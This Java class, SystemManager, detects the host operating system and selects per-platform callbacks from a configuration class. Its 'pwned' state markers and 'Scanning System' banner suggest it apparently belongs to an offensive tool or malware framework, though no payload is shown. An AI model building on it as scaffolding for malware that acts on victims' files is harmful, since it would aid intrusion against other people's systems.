package aluka.core;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.util.List;
import java.util.function.Supplier;

import aluka.configuration.Configuration;


public class SystemManager {

	private Supplier<List<String>> callback;

	private String state;
	public String operatingSystem;
	
	public SystemManager() {
		System.out.println("[ + ] - Scanning System");
		String os = System.getProperty("os.name").toLowerCase();
		if (os.contains("win")) {
			callback = Configuration.getWindowsCallback();
			this.operatingSystem = "windows";
			state = "pwned";
		} else if (os.contains("osx")) {
			callback = Configuration.getMacosCallback();
			this.state = "/tmp/pwned";
			this.operatingSystem = "macos";
		} else if (os.contains("nix") || os.contains("aix") || os.contains("nux")) {
			callback = Configuration.getLinuxCallback();
			this.state = "/tmp/pwned";
			this.operatingSystem = "linux";
		} else {
			callback = Configuration.getWindowsCallback();
			this.operatingSystem = "windows";
		}
	}

	public Supplier<List<String>> getCallback() {
		return callback;
	}

	public void setCallback(Supplier<List<String>> callback) {
		this.callback = callback;
	}

	public String[] getStartPath() {
		return new String[] { "./files" };
	}
	
	public String getOsType() {
		return this.operatingSystem;
	}
	
	public String getConfigPath() {
		return state;
	}
}
